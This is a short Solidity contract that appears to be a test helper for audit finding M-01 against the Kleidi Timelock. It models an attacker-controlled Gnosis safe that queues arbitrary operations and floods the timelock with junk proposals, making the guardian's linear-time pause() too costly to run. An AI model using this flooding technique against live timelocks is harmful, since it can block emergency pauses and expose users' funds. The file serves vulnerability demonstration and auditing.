// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {Timelock} from "../Timelock.sol";

/// @notice Attacker-controlled stand-in for the Kleidi Gnosis safe.
///
/// The M-01 threat model assumes the safe's threshold of cold-signer keys is
/// compromised: the attacker then drives every safe-gated Timelock function,
/// i.e. queueing arbitrary (and arbitrarily many) operations. The operator
/// here is the attacker's EOA, so every function below is attacker-gated.
contract CompromisedSafe {
    /// @notice the attacker EOA that controls this safe
    address public immutable operator;

    modifier onlyOperator() {
        require(msg.sender == operator, "CompromisedSafe: not operator");
        _;
    }

    constructor(address _operator) {
        operator = _operator;
    }

    /// @notice queue a timelocked operation as the safe, at the minimum
    /// delay (the Timelock MIN_DELAY constant of 1 day)
    function queue(
        address payable timelock,
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 salt
    ) external onlyOperator {
        Timelock(timelock).schedule(target, value, data, salt, 1 days);
    }

    /// @notice queue `count` junk proposals in one transaction; salts run
    /// from `startSalt` to `startSalt + count - 1` so distinct calls add
    /// distinct proposals. Every junk proposal is a no-op call to the
    /// timelock itself, delayed by the minimum delay, and never executed;
    /// they exist only to inflate the live-proposal set the guardian's
    /// O(n) pause() has to walk.
    function flood(
        address payable timelock,
        uint256 startSalt,
        uint256 count
    ) external onlyOperator {
        for (uint256 i = 0; i < count; i++) {
            Timelock(timelock).schedule(
                timelock, 0, "", bytes32(startSalt + i), 1 days
            );
        }
    }
}
